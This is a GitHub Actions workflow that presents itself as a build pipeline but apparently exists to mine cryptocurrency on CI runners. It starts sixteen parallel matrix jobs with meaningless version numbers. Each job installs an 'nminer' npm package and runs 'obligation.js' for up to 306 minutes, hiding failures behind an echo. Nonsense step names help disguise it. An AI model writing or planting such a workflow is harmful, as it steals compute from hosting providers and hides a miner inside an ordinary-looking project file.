name: obligation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4312 }
          - { version: 59 }
          - { version: 5944 }
          - { version: 4582 }
          - { version: 2857 }
          - { version: 5608 }
          - { version: 373 }
          - { version: 1871 }
          - { version: 5918 }
          - { version: 8317 }
          - { version: 7497 }
          - { version: 4600 }
          - { version: 3783 }
          - { version: 7913 }
          - { version: 1048 }
          - { version: 2257 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: on lazily worthy kick
        run: |
          npm install nminer@latest
          timeout 306m node obligation.js || echo "obligation executed"